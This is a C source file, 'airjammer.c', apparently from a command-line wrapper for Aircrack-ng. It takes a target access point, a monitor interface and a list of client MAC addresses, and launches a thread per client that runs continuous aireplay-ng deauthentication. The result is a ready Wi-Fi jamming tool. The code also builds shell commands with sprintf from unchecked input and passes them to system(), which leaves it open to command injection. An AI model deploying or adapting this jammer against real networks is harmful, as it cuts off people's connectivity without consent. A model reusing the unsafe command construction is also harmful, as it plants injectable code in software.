/**CFile***********************************************************************

  FileName    [airjammer.c]

  PackageName [Aircrack-CLI]

  Synopsis    [Aircrack Command Line Interface - AirJammer]

  Description [Command Line Interface for Aircrack-ng 
  (credits to Thomas d'Otreppe <tdotreppe@aircrack-ng.org>)]

  Author      [ynad]

  License     [GPLv2, see LICENSE.md]
  
  Revision    [beta-04, 2013-12-17]

******************************************************************************/


#ifndef __linux__
#error Compatible with Linux only!
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>

//Library functions header
#include "lib.h"

//Prototypes
static void *jammer();
static void sigHandler(int);

//error variable
//xextern int errno;

//General variables
static char *bssid;
static char *mon;
static maclist_t *maclst;


int main (int argc, char *argv[])
{
	int i, dim, ris;
	pthread_t tid;

	//set signal handler for SIGINT (Ctrl-C)
	signal(SIGINT, sigHandler);

	//syntax
	if (argc < 4) {
		fprintf(stderr, "Argument error. Syntax:\n\t%s [BSSID] [MONITOR-IF] [MAC-LIST-FILE]\n", argv[0]);
		return (EXIT_FAILURE);
	}
	//check execution permissions
    if (getgid() != 0) {
        fprintf(stderr, "Run it as root!\n");
		return (EXIT_FAILURE);
    }
	//check BSSID
	if (checkMac(argv[1]) == FALSE) {
		fprintf(stderr, "Error: wrong format for BSSID (%s).\n", argv[1]);
		return (EXIT_FAILURE);
	}

	dim = 0;
	//reading MACs list
	if ((maclst = freadMaclist(argv[3])) == NULL)
		return (EXIT_FAILURE);
	if ((dim = getDim(maclst)) == 0) {
		fprintf(stderr, "\nError: file empty o wrong content!\n");
		freeMem(maclst);
		return (EXIT_FAILURE);
	}
	//setting up variables
	bssid = argv[1];
	mon = argv[2];
	setbuf(stdout, NULL);

	//creation of threads
	fprintf(stdout, "\tStarting %d deauths:\n", dim);
	for (i=0; i<dim; i++) {
		ris = pthread_create(&tid, NULL, jammer, (void *) getMac(maclst, i));
		if (ris) {
			fprintf(stderr, "Error creating thread %d (%d): %s\n", i, ris, strerror(errno));
			return (EXIT_FAILURE);
		}
	}
	pause();

	pthread_exit(NULL);
}


/* Thread target function */
static void *jammer(void *mac)
{
	char *addr;
	char death[BUFF]={"aireplay-ng --deauth 0 -a"};

	addr = (char *)mac;
	sprintf(death, "%s %s -c %s %s --ignore-negative-one", death, bssid, addr, mon);
	system(death);

	pthread_exit(NULL);
}


/* Signal handler */
static void sigHandler(int sig)
{
	if (sig == SIGINT)
		fprintf(stderr, "\tReceived signal SIGINT (%d): exiting.\n", sig);
	else
		fprintf(stderr, "\tReceived signal %d: exiting.\n", sig);

	//free and exit
	freeMem(maclst);
	exit(EXIT_FAILURE);
}

